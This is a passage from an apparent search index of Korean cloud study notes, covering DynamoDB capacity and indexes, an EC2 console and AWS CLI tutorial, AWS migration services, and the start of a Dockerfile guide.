데이터 형식은 스칼라 집합 데이터 형식의 제약을 벗어나는 여러 형식의 데이터를 담을 수 있도록 설계되어 있으며, 최대 32레벨의 문서 형식을 중첩할 수 있다. 목록 문서 형식은 순서가 지정된 모든 형식의 값 모음을 저장할 수 있다. 하단은 목록 문서의 예시를 나타낸다      Chroes : [\u0026#34;Make coffee\u0026#34;, Groceries : [\u0026#34;milk\u0026#34;, \u0026#34;eggs\u0026#34;, \u0026#34;cheese\u0026#34;], \u0026#34;Pay bills\u0026#34;, Bills:[water: [60], electric:[100]]] # Chroes 목록에는 문자열 데이터, 숫자 데이터, 중첩 목록이 포함되어 있다.  맵 데이터 형식  맵 데이터 형식은 정렬되지 않은 키-값 페어의 집합을 JSON과 유사한 형식으로 저장할 수 있으며, 목록형식과 마찬가지로 포함할 수 있는 데이터 형시에는 제한이 없다. 하단은 맵 데이터 형식의 예시을 나타낸다.    { Day: \u0026#34;Friday\u0026#34;, Chores: [ \u0026#34;Make coffee\u0026#34;, \u0026#34;Groceries\u0026#34;, { Milk: { Quantity: 1}, eggs: { Quantity: 12}, } \u0026#34;Mow the lawn\u0026#34;], }    처리용량   테이블을 만들 때 애플리테이션에 필요한 초당 읽기 및 쓰기 횟수를 지정해야 하며, 이를 프로비저닝된 처리량이라 한다.\n  DynamoDB는 테이블을을 만들 때 지정한 읽기 용량 단위 (Read Capacity Unitss : RCU) 및 쓰기 용량 단위 (Write Capacity Units : WCU) 갯수로 파티션을 예약한다.\n  최대 4KB 크기의 항목을 기준으로 할 때, 1개의 RCU는 1개의 강력한 일관된 초당읽리를 제공하며, 일관된 읽기를 매초 8KB를 읽으려면 2개의 RCU가 필요하다.\n  1개의 RCU는 초당 2개의 최종적 일관된 읽기를 제공하며, 최종적 일관된 읽기를 매초 8KB 항목을 읽으려면 1개의 RCU만 있으면 된다.\n  데이터 쓰기의 경우, 1개의 WCU는 최대 1KB 크기의 항목 1개 쓰기를 제공하며, 1KB 미만인 항목을 초당 100개 쓰기 해야 한다면, 100개 WCU가 필요하다. 2KB 항목을 초당 10개 쓰기 위해서는 20개의 WCU가 필요하다.\n  DynamoDB가 제공하는 최대 처리 용량은 사용자가 지정하며, 이를 초과하면 DynamoDB요청을 차단하고, \u0026lsquo;HTTP 400(bad request)\u0026rsquo; 오류를 발생시킬 수 있다. AWS SDK는 조정 후 요청 재시도 기능을 지원하므로, 요청을 조정해서 애플리케이션이 데이터를 읽거나 쓰는 것을 막을 수는 있지만, 애플리케이션의 반응 속도는 느려지게 된다.\n       Auto Scaling   테이블에 얼마만큼 처리량을 프로비저닝해야 할지 정확하지 않거나 시간에 따라 처리량의 요구가 달라질 것으로 예상할 때, Auto Scaling을 구성해서 정해 놓은 임계치에 가깝게 도달하면 자동으로 프로비저닝된 처리량을 증가하게 할 수 있다.\n  Auto Scaling을 구성할 때 최소/ 최대 RCU와 WCU를 지정하고, 목표 사용률을 지정한다.\n  DynamoDB는 RCU와 WCU를 자동으로 조정해서 이 목표 사용률에 따라 사용률을 유지한다.\n  예를 들어 70%, 최소 10 RCU, 최대 50 RCU로 설정하는 경우, 21 RCU를 소비할 때 Auto Scaling은 프로비저닝된 용량을 약 30 RCU로 조정한다.\n  소비자가 14 RCU로 떨어지면 Auto Scaling은 프로비저닝된 처리량을 20 RCU로 축소한다.\n  적절한 사용률을 설정하면 작업에 균형을 이룰 수 있으나, 사용률을 높게 설정할수록 프로비정된 용량을 초과할 가능성은 커지고, 요청이 제한될 수 있다.\n  반면 사용률을 너무 낮게 설정하면 필요하지 않은 용량에 비용을 지급하게 된다.\n       예약 용령  100 이상의 WCU나 RCU가 필요할 때 예약 처리 용량을 구매해서 비용을 절약할 수 있다. RCU와 WCU를 별도로 예약해야 하며, 각각 100,000유닛으로 제한되 있으며, 1년이나 3년 사용 기간을 약정하고 선불로 지급한다.       데이터 읽기   DynamoDB는 테이블에서 두 가지 방식으로 데이터를 읽는다.\n  스캔은 모든 테이블 항목을 나열하며, 읽기 집약적 작업이므로 프로비저닝된 용량 단위를 모두 사용할 가능성이 있다.\n  쿼리는 파티션 키값을 기반으로 항목을 반환하며, 쿼리를 수행할 때 검색하는 파티션의 키의 값은 항목의 갑과 정확히 일치해야 한다.\n  테이블에 정렬 키가 포함되어 있으면, 정렬 키로도 쿼리할 수 있다.\n  정렬 키를 사용하면 정확한 값, 키보다 크거나 작은 값, 값의 범위, 값의 시작 등으로 더 유연하게 검색을 수행할 수 있다.\n       보조 인덱스   보조 인덱스는 DynamoDB에서 데이터를 쿼리할 때 발생하는 두 가지 문제를 해결한다.\n  사용자는 특정 항목을 쿼리할 때 파티션 키를 정확하게 지정해야한 한다.\n  보조 인덱스를 만들 때 기본 테이블에서 인덱스로 복사할 속성을 선택할 수 있는 데, 이를 프로젝션된 속성 (Projected Attributes)라고 한다.\n  보조 인덱스는 항상 기본 테이블의 파티션 키와 정렬 키 속성을 포함하며, 파티션 키와 정렬 키, 키 값만은 선택해서 복사하거나 키 값에 다른 속성을 추가해서 필요한 방식으로 데이터를 추출할 수 있다.\n       글로벌 보조 인덱스   테이블을 만든 후에 언제든지 글로벌 보조 인덱스 (Global Secondary Index)를 만들 수 있다.\n  글로벌 보조 인덱스에서 파티션 키와 해시 키는 기본 테이블과 다를 수 있지만, 기본 키 선택과 같은 규칙이 여전히 적용된다.\n  인덱스의 기본 키는 고유하게 유지해야 하고, 복합 기본 키를 사용하면 파티션 키에서 같은 값을 가진 항목이 같은 파티션에 저장된다.\n  글로벌 보조 인덱스에서 읽을 때는 항상 읽기 일관성이 유지되며, 항모을 테이블에 추가하더라도 즉시 보조 인덱스로 복사되지 않을 수 있다.\n       로컬 보조 인덱스   로컬 보조 인덱스 (Local Secondary Index : LSI)는 기본 테이블과 동시에 만들어져야 하며 일단 만들면 삭제할 수 없다.\n  파티션 키는 항상 기본 테이블과 같아야 하지만, 정령 키는 다룰 수 있다.\n  예를 들어 기본 테이블에 LastName이 파티션 키이고 FirstName이 정렬 키이면, 파티션 키를 LastName이고 정렬 키를 BirthYear로 하는 로컬 보조 인덱스를 만들 수 있다.\n  로컬 보조 인덱스의 읽기 시간을 얼마에 지정하냐에 ㄸ라 강력한 일관성 또는 최종적 일관성이 될 수 있다.\n       요약    관계형 데이터베이스 또는 비관계형 데이터베이스의 사용 여부는 애플리케이션의 속성에 달려 있다.\n  관계형 데이터베이스는 오랫동안 사용되어 왔으며, 많은 애플리케이션 개발자들은 기본적으로 관게형 데이터베이스에 맞게 데이터를 설계한다.\n  애플리케이션은 특정 데이터베이스의 SDK를 사용해 데이터베이스와 상호 작용하므로 애플리케이션의 요구에 따라 특정 데이터베이스 엔진이 필요하게 된다.\n  이러한 이유로 AWS RDS는 가장 널리 사용되는 6개 데이터베이스 엔진과 광범위한 버전 호환성을 지원함, 이는 애플리케이션을 변경하지 않고 기존 데이터베이스를 가져와서 RDS로 옮길 수 있도록 하려는 것이다.\n  비관계형 데이터베이스는 최근에 창안되었으며, DynamoDBsms Amazon이 소유권을 가지고 있는 비관계형 데이터베이스 서비스이다.\n  보통 관계형 데이터베이스용으로 설계된 애플리케이션과는 달리 온프레미스에서 배포해 사용하던 비관게형 데이터베이스용 애플리케이션은 대부분 코드를 변겨해야 DynamoDB로 이식할 수 있다.\n  따라서 DynamoDB를 사용하는 애플리케이션을 개발하거나 재개발할 때 개발자에게 데이터베이스를 설계하는 법을 자문할 수도 있다.\n  이 경우 파티션 키, 정렬 키, 데이터 형식을 선택하는 방법과 애플리에키션 성능 요구를 충족하기 위해 처리 용량을 할당하는 법을 이해하는 것이 중요하다.\n  AWS 아키텍트는 적절한 데이터베이스와 AWS 서비스를 사용해서 성능 및 가용성 요구사항을 결정하고 올바르게 구현해야 한다.\n     시험핵심   관계형 데이터베이스와 비관계형 데이터베이스의 차이점을 이해한다.   관계형 데이터베이스에서는 테이블을 생성하기 전에 속성을 정해야 한다.\n  테이블에 입력하는 모든 데이터는 사전에 정한 속성과 부합해야 한다.\n  데이터를 읽고 쓰는 데 SQL을 사용하므로 이를 SQL 데이터베이스라고도 한다.\n  비 관계형 데이터베이스에서 테이블을 만들 때 요구하는 것은 기본 키 속성뿐이다.\n  테이블의 모든 항목은 기본 키를 포함해야 한다는 것만 제외하면 속성을 다양하게 가질 수 있다는 유연성도 있다.\n  비관계형 데이터베이스 또는 NoSQL 데이터베이스는 비정형 데이터를 저장한다.\n       RDS가 지원하는 여러 데이터베이스 엔진을 파악하자   RDS는 MySQL, MariaDB, Oracle, PostgreSQL, Amazon Aurora, Microsoft SQL Server와 같이 많이 사용되는 대부분 데이터베이스 엔진을 지원한다.\n  기본 보유 라이센스 사용과 라이센스 포함된 모델의 차이점을 이해해야 하며, 어떤 데이터베이스 엔진이 어떤 라이센스 모델을 지원하는 지 파악해야 한다.\n       특정 스토리지 요구 사항에 맞는 인스턴스 클래스와 스토리지 유형으르 선택할 수 있어야 한다.   메모리와 스토리지가 관계형 데이터베이스의 제약 요인이 되는 경향이 있으므로 데이터베이스의 성능 요구 사항을 기반으로 올바른 인스턴스 클래스와 스토리지 유형을 선택하는 방법을 알고 있어야 한다.\n  표준, 메모리 최적화, 순간 확장 가능의 세 가지 인스턴스 클래스를 파악해야 하며, 또한 세 클래스의 범용 SSD(gp2), 프로비저닝된 IOPS SSD(io1), 마그네틱 세 가지 스토리지 유형과 어떤 관련이 있는지 알아야 한다.\n       다른 AZ와 읽기 전용 복제본의 차이점을 이해한다.   다중 AZ와 읽기 전용 복제본 모두 추가 데이터베이스 인스턴스를 만든다는 점에서는 연관되지만, 몇 가지 주요 차이점이 존재한다.\n  읽기 전용 복제보은 쿼리를 처리할 수 있지만, 다중 AZ 배포에서 예비 인스턴스는 불가능하다.\n  마스터 인스턴스는 읽기 전용 복제본에 비동기로 복제하지만, 다중 AZ 구성에서는 기본 인스턴스에서 예비 인스턴스로 동기로 데이터 복제가 이루어 진다.\n  Auroa 복제본은 작동 방식과 Aurora 다중 AZ가 다른 데이터베이스 엔진의 AZ와 어떻게 다른지 이해해야 한다.\n       DynamoDB 테이블에 적합한 기본 키 형식을 결정할 수 있어야 한다.   DynamoDB 테이블은 두 가지 종류의 기본 키를 제공한다.\n  단순 기본 키 파티션 키로만 구성되며 단일 값을 가지고 있다. DynamoDB는 파티션 키의 값에 따라 항목을 파티션에 분산시킨다.\n  단순 기본 키를 사용할 때 파티션 키는 테이블 내에서 고유해야 하며, 복합 기본 키는 파티션 키와 정렬 키로 구성된다.\n  파티션 키는 고유할 필요는 없지만, 파티션 키와 정렬 키의 조합은 고유해야한다.\n       DynamoDB 처리 용량이 어떻게 작동하는지 파악한다.   테이블을 생성할 때 쓰기 용량 단위와 읽기 용량 단위로 처리용량을 지저해야 한다.\n  다음 두 가지의 따라 읽기 작업이 읽기 용량 단위를 얼마나 소모할지 결정된다.\n 읽기 작업이 강력하게 읽관적인지 최종적으로 일관적인지와 1초에 읽을 데이터의 용량이다. 최대 4KB 크기 항모글 강력한 일관된 읽기 작업을 할 때 하나의 읽기 용량을 단위로 사용한다. 최종적으로 일관된 읽기작업은 그 절반을 소비한다. 쓰기 용량 단위 하나를 사용해 쓰기 작업을 하면 초당 하나의 1KB 항목을 쓸 수 있다.        "}),a.add({id:97,href:'/docs/aws/awstraining/ec2/',title:"AWS EC2 생성",content:"AWS EC2 생성    AWS EC2 생성    이번 장에서는 저번 장에서 생성했던 사용자 정의 VPC의 대역에 EC2를 생성해 보도록 하겠습니다. EC2 또한 중요한 개념이므로, EC2에 대한 학습을 원하는 분들은 AWS EC2를 참고해주세요.      EC2 ( Elastic Compute Cloud ) 생성   기본적인 EC2 생성의 순서\n1. AMI ( Amazon Machin Image ) 선택 2. Instance type 선택\n2. Instance Network 설정\n3. Storage 설정\n5. Tag 설정\n6. Security Group 설정 여기에서는 처음에는 기본 VPC, 후에는 전장에서 생성했던 VPC에 생성해보도록 하겠습니다..   검색에서 EC2를 입력후 인스턴스로 들어갑니다.      대시보드에서 현재 사용량을 확인할 수 있습니다. 인스턴스 생성을 위해 좌측 메뉴에 인스턴스를 클릭합니다.      인스턴스 시작을 클릭합니다.      AMI 선택에서는 이미지 파일을 선택할 수 있습니다. 여기에서는 Amzon Linux를 생성하겠습니다. 또한 AMI는 직접 만들 수 있으며, AWS Marketplace를 통해서 타 유저의 이미지를 구매할 수도 있습니다.      AWS 인스턴스 유형에서는 cpu, ram 스토리지의 유형과 사양 등을 선택할 수 있습니다. 여기에서는 과금이 발생하지 않게 t2.micro를 선택하겠습니다.      인스턴스 세부 정보 구성에서는 인스턴스의 수, VPC 서비넷 대역, 용량 예약, IAM 역할 등 세부 정보를 설정할 수 있습니다. 여기서는 기본 값으로 생성하겠습니다.      설정 항목 설명     인스턴스 갯수 기동할 인스턴스의 수를 나타냅니다.   구매 옵션 구매 옵션을 선택합니다. 체크 시 스팟 인스턴스로 구입할 수 있습니다.   네트워크 인스턴스를 기동할 VPC를 나타냅니다.   서브넷 인스턴스가 소속될 서브넷을 나타냅니다.   퍼블릭 IP 자동 할당 자동적으로 퍼블릭 IP를 부여할지 설정합니다.   배치 그룹에 인스턴스 추가 배치 그룹을 선택합니다. 체크 시 배치 그룹에서 인스턴스를 생성합니다.   용량 예약 용량 예약은 특정 가용 영역에서 인스턴스가 시작되도록 예약합니다.   IAM 역할 EC2 인스턴스에 부여할 IAM권한을 설정합니다.   종료 방지 EC2 인스턴스의 삭제를 막습니다.   모니터링 CloudWatch를 통한 모니터링 서비스를 활성화합니다. 화성화하면 1분 간격으로 CloudWatch에 데이터가 전송됩니다. ( 일반적으로 5분 간격을 설정 )   테넌시 하드웨어 점유 옵션으로, Shred를 선택시 공유, Dedicated를 선택하면 완전 점유합니다.   사용자 데이터 인스턴스 실행시 셀 스크립트 또는 cloud-init 디렉티브를 작성할 수 있습니다.         스토리지 추가에서는 볼륨을 추가할 수 있습니다.      태그 추가에서는, 인스턴스에 대한 세부사항을 정의할 수 있습니다. 여기서는 기본 값으로 생성하겠습니다.      보안 그룹에서는 생성되는 EC2에 대한 보안 그룹을 지정합니다. 현재는 접속을 위해 TCP 22번 포트만 열어둔 상태로 생성하겠습니다.      검사에서는 현재까지의 설정을 확인할 수 있습니다. 인스턴스 시작을 누르면 키 페어를 선택창이 등장합니다. 여기서는 키 페어를 하나 생성하도록 하겠습니다.      리눅스 운영체제를 통할 때에는 pem 파일을, Window를 사용할 때에는 ppk 파일을 사용하기에, 여기서는 pem 파일을 Putty key generator를 이용해 변경시켰습니다.      생성이 완료되면, 인스턴스로 돌아와 생성되어진 인스턴스를 확인합니다. 기본적으로 Pendig은 생성, Running은 실행가능, stop은 중지상태, shuttinf-down은 삭제 중, Terminated는 삭제된 상태를 의미하며, Running 상태에서만 요금이 부과됩니다. 상단에는 간략한 EC2들의 정보를 나타내며, 하단에는 상세 정보를 나타냅니다. 여기서 접속을 위해 IPv4 퍼블릭 IP를 복사합니다.      Putty를 사용해 퍼블릭 IP와 프라이빗 키를 등록하면 접속이 가능합니다. 기본적으로 기본 계정은 AWS Linux : EC2-user, Ubuntu : ubuntu Centos : centos 입니다.      생성된 인스턴스에서 정상적으로 핑이 나가는 것을 확인하실 수 있으나, Window에서는 핑이 가지 않는 것을 확인하실 수 있습니다. 이는 전에 선택한 보안그룹으로 22번/TCP 포트밖에 사용하지 않았기 때문으로, 만약 보안그룹에 ICMP를 열어둔다면, Ping이 가능하게 할 수 있습니다. 이와 같이 보안그룹은 AWS에서 다방면으로 매우 중요한 역할을 수행합니다.      이어서 인스턴스의 상태변경은 인스턴스를 선택후 작업, 혹은 오른쪽마우스로 가능합니다. 저는 삭제를 위해 종료를 클릭하겠습니다.      삭제가 완료되었습니다.     사용자 정의 VPC 대역에 EC2 생성    저번 장에서 생성했던 VPC 대역에 EC2를 생성해보도록 하겠습니다. 인스턴스의 Network 설정까지는 동일하며, 그 후는 아래와 같습니다.    인스턴스의 Network 설정에서 네트워크, 서브넷, 퍼블릭 IP 자동할당을 설정합니다. 단, 두 개의 인스턴스를 생성하며, 하나의 인스턴스는 IP 자동할당 활성화, 다른 인스턴스는 IP자동할당을 비활성화인 채로 생성합니다. 여기에서는 저번장에서 생성한 2개의 서브넷을 사용했습니다. Pulbic : 할당 활성화, Private : 할당 비활성화 또한 위와 같이 ssh의 접속이 가능하게 보안그룹을 설정합니다.      생성이 완료되었습니다.      이제 Putty를 통해 퍼블릭과 프라이빗에 접속합니다. 하지만, 프라이빗 대역은 퍼블릭 IP를 할당받지 않아 접속이 불가능합니다.      하지만 퍼블릭 서브넷의 인스턴스는 공통의 라우팅 테이블로 igw를 사용하기 때문에 프라이빗 IP를 알수 있어 접속이 가능합니다. 또한 이와 같은 방법으로 보안그룹을 ssh접속이 가능한 한 컴퓨터만 혹은 서브넷이나 그룹등을 지정하거나, gateway를 특정 인스턴스로 지정하여 보안성을 높이는 것이 가능합니다.     CLI를 통한 인스턴스 관리     $ aws ec2 help  aws ec2에 명령어를 알려줍니다.     $ aws ec2 create-key-pair --key-name [ 키 페어 이름 ] --query \u0026#39;KeyMaterial\u0026#39; --output text | out-file \u0026gt; [ 키 페어 경로 ].pem # KeyMaterial은 키의 값입니다. $ impkey=\u0026#39;cat~/[ import 시킬 키 파일의 경로 ]\u0026#39; $ aws ec2 import-key-pair --key-name [ 키 페어 이름 ] --public-key-material ${impkey} # 외부 키 페어 임포트 방법 # AWS 콘솔 EC2-Key Pairs -\u0026gt; Import Key Pair로도 가능합니다.  키 페어를 생성합니다.     $ aws ec2 delete-key-pair --key-name [ 키 페어 이름 ]  키 페어를 삭제합니다.     $ aws ec2 create-security-group --group-name [ 보안 그룹 이름 ] --description [ 보안 그룹 설명 ] --vpcid [ VPC ID ]  보안 그룹을 생성합니다.     $ aws ec2 authorize-security-group-ingress \\ --group-id [ Security-group-id ] \\ --protocol tcp \\ --port 22 \\ --cidr 0.0.0.0/0 # Security-group-id의 보안 그룹의 22/tcp의 모든 접속이 가능하게 설정을 추가합니다. $ aws ec2 describe-security-groups \\ --group-ids [ Security-group-id ] \\ --output json  보안 그룹을 생성합니다.     $ aws ec2 describe-security-groups --group-ids [ 보안 그룹 ID ]  보안 그룹의 상세 설명을 출력합니다.     $ aws ec2 create-security-group --group-name [ 보안 그룹 이름 ] --description [ 보안 그룹 설명 ]  EC2를 생성할 때, 보안 그룹을 생성합니다.     $ aws ec2 run-instances \\ --image-id [ 이미지 이름 ] \\ --count [ 인스턴스 수 ] \\ --instance-type [ falvor ] \\ --key [ 키 페어 이름 ] \\ --security-group-ids [ 보안 그룹 ID ] --subnet-id [ 서브넷 ID ] \\ --associate-public-ip-addres # 퍼블릭 IP 할당 유무 --user-data file://[ 파일경로 ] # 인스턴스를 생성합니다. $ aws ec2 create-tags \\ --resources [ 인스턴스 id ] --tags Key=name,Value=[ 태그 내용 ] # 인스턴스에 태그 등록  인스턴스를 생성합니다.   #!/bin/bash apt install -y apache2 #cloud-config packages: - apache2  user data 사용시 사용가능한 형식     aws ec2 describe-instances --filters \u0026#34;[ 필터 값 ], Value=[ 값1, 값2 ]\u0026#34;  특정 ec2를 나열합니다.     aws ec2 start-instances --instance-ids [ 인스턴스 ID ] aws ec2 stop-instances --instance-ids [ 인스턴스 ID ] aws ec2 terminate-instances --instance-ids [ 인스턴스 ID ]  인스턴스의 상태를 변경합니다.     예제   예제 1. 다음의 인스턴스를 생성해보세요.  1. OS : Ubuntu18.04\n2. Instance-type : t2.micro\n3. Instance-count : 2\n4. Network : 기본 VPC 및 기본 Subnet\n5. Security-Group : 80/tcp, 22/tcp의 포트가 모두 접속할 수 있게 설정해주세요.\n6. 새로운 Key-pair를 생성하여 접속 후, Apache2를 설치하세요.\n7. 각각의 인스턴스에 접속하여 확인합니다.\n    예제 2. 다음의 인스턴스를 생성해보세요.  1. OS : Ubuntu16.04\n2. Instance-type : t2.micro\n3. Instance-count : 1\n4. Network : 사용자 생성 VPC 및 Subnet\n5. User-data에 값을 입력하여 자동으로 Apache가 설치되게 설정하세요.\n6. Security-Group : 80/tcp 포트만 모두 접속할 수 있게 설정해주세요.\n7. 기존에 Key-pair로 생성하세요.\n8. 인스턴에 접속하여 확인합니다.\n "}),a.add({id:98,href:'/docs/aws/amazonwebservice/aws_migrate/',title:"AWS Migrate",content:"AWS Migrate   AWS Application Discovery Service    AWS Application Discovery Service는 서버로부터 구성, 사용 및 동작 데이터를 수집하여 제공함으로써 워크로를 효율적 관리를 도와주는 서비스 기업의 고객이 사내 데이터 센터에 대한 정보를 수집하여 마이그레이션 프로젝트를 계획하는 데 도움을 줌 데이터 센터 마이그레이션을 계획하는 작업에는 상호 의존성이 높은 수천 개의 워크로드가 수반 되어지는 짐 수집된 데이터는 AWS Application Discovey Service 데이터 스토어에 암호화된 형태로 보관되어짐   AWS Application Discovery Service의 이점  마이그레이션 계획 수립을 위한 신뢰할 수 있는 검색  Application Discovey Service는 서버 사양 정보, 성능 데이터, 실행 프로세스 및 네트워크 연결 세부 정보를 수집, 이러한 데이터는 AWS로 마이그레이션하기 전에 상세한 비용 추정을 수행하거나 계획을 위해 서버를 애플리케이션으로 그룹화하는 데 사용될 수 있음   Migration Hub와 통합  AWS Application Discovery Service는 AWS Migration Hub와 통합되므로 마이그레이션 추적이 간소화 및 Hub를 통한 마이그레이션 상태 추적이 가능   암호화로 데이터 보호  AWS Application Discovery Service는 수집한 데이터를 AWS로 전송할 때와 Application Discovery Service 데이터 스토어에 저장할 때 모두 암호화   마이그레이션 전문가의 지원  AWS Professional Services와 APN 마이그레이션 파트너는 수많은 엔터프라이즈 고객이 클라우드로의 마이그레이션을 성공적으로 완료하도록 지원     AWS DMS ( Database Migration Service )    AWS Database Migration Service는 데이터베이스를 AWS로 빠르고 안전하게 마이그레이션할 수 있도록 지원하는 서비스 이그레이션하는 동안 소스 데이터베이스가 변함없이 운영되어 해당 데이터베이스를 사용하는 애플리케이션의 가동 중지 시간을 최소화 AWS Database Migration Service는 Oracle에서 Oracle로의 마이그레이션과 같은 동종 마이그레이션뿐 아니라 Oracle 또는 Microsoft SQL Server에서 Amazon Aurora로의 마이그레이션과 같은 이기종 데이터베이스 플랫폼 간의 마이그레이션도 지원 데이터베이스를 Amazon Aurora, Amazon Redshift, Amazon DynamoDB 또는 Amazon DocumentDB(MongoDB 호환 가능)로 마이그레이션하는 경우 6개월 동안 DMS를 무료로 제공   AWS DMS의 이점  간편한 사용  AWS Management Console에서 클릭 몇 번으로 데이터베이스 마이그레이션을 시작 마이그레이션이 시작되면, 마이그레이션 프로세스 도중에 소스 데이터베이스에 발생한 데이터 변경을 자동으로 복제하는 것을 비롯하여 마이그레이션 프로세스의 모든 복잡성을 DMS에서 관리   최소한의 가동 중단  AWS Database Migration Service는 사실상 가동 중단 시간 없이 데이터베이스를 AWS로 마이그레이션하도록 지원 마이그레이션하는 동안 소스 데이터베이스에 발생한 모든 데이터 변경 사항은 지속적으로 대상 데이터베이스에 복제되므로, 마이그레이션하는 동안 소스 데이터베이스가 변함없이 운영   널리 사용되는 데이터베이스 지원  AWS Database Migration Service를 사용하면 가장 널리 사용되는 상용 및 오픈 소스 데이터베이스 플랫폼에서 또는 이를 대상으로 데이터를 마이그레이션 가능   저렴한 비용  마이그레이션 프로세스 중에 사용한 컴퓨팅 리소스와 추가 로그 스토리지에 대한 비용만 지불 라바이트 규모의 데이터베이스를 3 USD라는 저렴한 비용   빠르고 쉬운 설정  마이그레이션 태스크는 AWS Database Migration Service가 마이그레이션을 실행하는 데 사용할 파라미터를 정의하는 곳 마이그레이션 태스크에는 소스 및 대상 데이터베이스에 대한 연결 설정과 더불어 마이그레이션 프로세스를 실행하는 데 사용할 복제 인스턴스 선택이 포함 동일한 태스크를 사용하여 실제로 마이그레이션을 수행하기 전에 테스트를 실행가능   안정성  AWS Database Migration Service는 복원력과 자가 복구 기능 존재 소스 및 대상 데이터베이스, 네트워크 연결성 및 복제 인스턴스를 지속적으로 모니터링     AWS SMS ( Server Migration Service )    AWS Server Migration Service는 온프레미스 VMware vSphere, Microsoft Hyper-V/SCVMM 및 Azure 가상 머신을 AWS 클라우드로 자동으로 마이그레이션하는 서비스 AWS SMS는 서버 VM을 Amazon EC2에 바로 배포할 수 있는 클라우드 호스팅된 Amazon 머신 이미지(AMI)를 증분 방식으로 복제하는 서비스   AWS SMS의 이점  클라우드 마이그레이션 프로세스가 단순화  마이그레이션이 시작되면 AWS SMS은(는) 복잡한 마이그레이션 프로세스를 관리하여 라이브 서버 볼륨의 AWS로 복제하고 새로운 AMI를 정기적으로 생성하는 작업 등을 자동화   여러 서버 마이그레이션 조율  AWS SMS는 복제 일정을 예약하고 애플리케이션을 구성하는 서버 그룹에 대한 진행 상황을 추적할 수 있도록 하여 서버 마이그레이션을 조율가능   서버 마이그레이션 증분 테스트  증분 복제 지원 기능을 통해 AWS SMS은(는) 마이그레이션된 서버에 대한 테스트를 신속하게 수행하고 확장가능 AWS SMS은(는) 증분 변경 사항을 온프레미스 서버에 복제한 후 그 차이만 클라우드로 전송하기 때문에 일부 변경 사항만 반복적으로 테스트를 통해 절약 가능   가장 많이 사용되는 운영 체제 지원  Windows 및 대표적인 몇 가지 Linux 배포판을 포함하는 운영 체제 이미지 복제를 지원   가동 중지 최소화  증분 AWS SMS 복제는 최종 전환 중 애플리케이션 가동 중지로 인한 비즈니스 영향을 최소화     AWS SMS 제한사항\n 고객이 한도 증가를 요청하지 않는 한, 계정당 50개의 VM을 동시에 마이그레이션 VM의 최초 복제부터 시작하여 VM당(계정당 아님) 90일의 서비스 사용 기간. 고객이 한도 증가를 요청하지 않는 한, 90일 후에는 진행 중인 복제를 종료 정당 50개의 동시 애플리케이션 마이그레이션 ( 각 애플리케이션에 대해 그룹 10개 및 서버 50개 제한 )  \r   AWS Snowball Edge    AWS Snowball Edge는 데이터 마이그레이션 및 엣지 컴퓨팅 디바이스이며, 두 가지 옵션으로 제공 페타바이트급 대용량 데이터를 전송하기 위한 서비스 Snowball Edge는 특정 Amazon EC2 인스턴스 유형과 AWS Lambda 함수를 지원하므로 고객은 AWS에서 개발하고 테스트한 후 원격 위치의 디바이스에 애플리케이션을 배포하여 데이터를 수집, 사전 처리 및 반환가능 서비스와 더불어 물리적인 실체가 있는 장비가 존재하여 AWS에 요청하면 Snow ball를 배송받고 On-premise의 데이터를 빠르게 Snowball로 이동시킨 뒤, 작업이 완료되면 이 물리 장비를 다시 AWS로 배송하고 S3 Bucket에 저장함 스토리지 용량은 최대 80TB까지 저장 가능   Snowball 이외에 기능이 추가된 Snowball Edge가 사용하는 경우  페타바이트 규모의 데이터를 AWS로 이송하는 경우 적합 VPN, Direct Connect, S3를 통한 직접적인 전송을 이용하기엔 데이터의 양이 많을 경우 Snowball을 사용하는 것이 좋음 또한 물리적으로 격리된 환경이거나 인터넷 환경이 좋지 않을 경우 사용 평균적으로 AWS로 데이터를 업로드하는데 1주일 이상이 소요되는 경우 Snowball 사용을 검토함   AWS Snoball의 이점  용이한 데이터 이동  Snowball Edge는 약 1주 만에 테라바이트 규모의 데이터를 이동 네트워크 조건이 AWS에서 대규모 데이터를 송수신하는 데 현실적으로 적합하지 않은 경우, 이를 사용하여 데이터베이스, 백업, 아카이브, 의료서비스 레코드, 분석 데이터 세트, IoT 센서 데이터 및 미디어 콘텐츠를 이동   간편한 사용  AWS에서 사전에 프로비저닝된 Snowball Edge 디바이스를 고객 위치로 자동으로 배송 디바이스를 반환할 준비가 되면, 전자 잉크 선적 레이블이 자동으로 업데이트되고 화물 운송업체가 업로드가 시작되는 올바른 AWS 시설로 운송   로컬에서 데이터 처리 및 분석  EC2 AMI를 실행하고 AWS Lambda 코드를 Snowball Edge에 배포하여 기계 학습 또는 다른 애플리케이션을 통한 로컬 처리나 분석을 실행 개발자와 관리자는 네트워크 연결 없이 일관된 AWS 환경으로 디바이스에서 직접 애플리케이션을 실행가능   독립형 스토리지  Snowball Edge 디바이스는 NFS(파일 공유 프로토콜) 또는 객체 스토리지 인터페이스(S3 API)를 통해 기존 온프레미스 애플리케이션에 로컬 스토리지를 제공   보안  Snowball Edge 디바이스는 변조 방지 엔클로저, 256-비트 암호화, 그리고 데이터의 보안 및 관리의 연속성을 보장하도록 설계된 업계 표준 Trusted Platform Module(TPM)을 사용   확장성  Snowball Edge 디바이스는 테라바이트 규모의 데이터를 전송할 수 있으며, 여러 대의 디바이스를 병렬로 사용하거나 함께 클러스터링하여 AWS에서 페타바이트 규모의 데이터를 송수신    "}),a.add({id:99,href:'/docs/docker/docker/docker/docker-5/',title:"Dockerfile",content:"Dockerfile   Dockerfile      도커는 이미지를 만들기 위해 Dockerfile 이라는 이미지 빌드용 DSL (Domain Specific Language 파일을 사용합니다.)\n  DSL은 단순한 텍스트 파일로 일반적으로 소스와 함께 관리됩니다.\n  $ sudo docker build \u0026lt;OPTIONS\u0026gt; \u0026lt;PATH\u0026gt; \u0026lt;URL\u0026gt; $ sudo docker build -t Mydocker .    Dockerfile 내부 살펴보기   하단 외의 추가적으로 궁금한 사항들은 Docker docs를 참조해주세요. Dockerfile 예시  # 1. ubuntu 설치 (패키지 업데이트 + 만든사람 표시) FROM ubuntu:18.04 MAINTAINER mung0001@mung0001.github.io RUN apt-get -y update RUN apt-get -y upgrade # 2. apache 설치 RUN apt-get -y install apache2 # 3. index.html 편집 RUN echo Hello \u0026gt; /var/www/html/index.html # 4. apache 서버 실행 (Listen 포트 정의) EXPOSE 80    FROM  FROM \u0026lt;image\u0026gt;:\u0026lt;tag\u0026gt; FROM ubuntu:16.04  베이스의 이미지를 지정하며 tag는 latest가 기본값으로 Docker hub에서 확인이 가능     MAINTAINER  MAINTAINER \u0026lt;name\u0026gt; MAINTAINER mung0001@mung0001.github.com  Dokerfile을 관리하는 사람의 이름 또는 